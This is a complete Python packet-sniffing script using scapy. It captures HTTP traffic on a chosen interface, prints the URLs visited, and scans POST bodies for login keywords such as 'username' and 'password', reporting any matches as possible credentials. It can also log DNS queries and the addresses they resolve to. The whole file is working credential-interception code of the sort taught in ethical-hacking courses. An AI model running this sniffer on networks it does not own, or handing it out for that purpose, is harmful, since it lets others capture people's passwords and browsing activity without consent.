#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http
import optparse


dns_types = {
    1: "A",
    2: "NS",
    5: "CNAME",
    6: "SOA",
    12: "PTR",
    15: "MX",
    16: "TXT",
    28: "AAAA",
    33: "SRV",
    255: "ANY"
}

def get_args():
    parser = optparse.OptionParser()

    parser.add_option("-i", "--interface", dest="interface", help="Enter the interface name which is to be scanned")
    parser.add_option("-d", "--dns",action="store_true", dest="dns", help="Used to sniff DNS packets only")

    (options, args) = parser.parse_args()
    if not options.interface:
        print("[-]Interface not provided, trying interface eth0")
        options.interface = "eth0"
    return options


def sniff_normal(interface):
    scapy.sniff(iface=interface, store = False, prn=process_stored_packets)


def sniff_dns(interface):
    scapy.sniff(iface=interface, store=False, prn=process_DNS_packets)


def process_DNS_packets(packet):
    if packet.haslayer(scapy.DNSRR) and packet.haslayer(scapy.DNSQR):
        global dns_types
        qname = packet[scapy.DNSQR].qname.decode()
        scope = packet[scapy.DNSRR].type
        rdata = packet[scapy.DNSRR].rdata
        
        print("[+]DNS packet found-->")
        print(f'Domain: {qname}')
        print(f'Record type: {dns_types[scope]}')
        print(f'Resolved IP: {rdata}')
        print('\n')

def get_url(packet):
    try:
        host = packet[http.HTTPRequest].Host.decode(errors="ignore")
        path = packet[http.HTTPRequest].Path.decode(errors="ignore")
        return host+path
    except:
        return ""


def get_post_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode(errors="ignore")
        method = packet[http.HTTPRequest].Method.decode(errors="ignore")
        if method == "POST":
            return load

    return None


def process_stored_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+]Visited Url: " + url)

        login_info = get_post_info(packet)
        keywords = ["username", "user", "login", "email",
                     "password", "pass", "passwd", "pwd",
                     "signin", "signup", "id", "txtusername", "txtUsername", "txtpassword", "txtpass", "txtPassword"]
        flag = False
        if login_info:
            for keyword in keywords:
                if keyword in login_info:
                    flag = True
                    break
        
            if flag:
                print("\n\n [+]Possible credentials: " + login_info + "\n\n")
            else:
                print("\n[+]might contain sensative data: "+ login_info + "\n")



options = get_args()

inf = options.interface
if options.dns:
    print("Capturing DNS packets: \n")
    sniff_dns(inf)
else:
    print("Capture mode normal: \n")
    sniff_normal(inf)


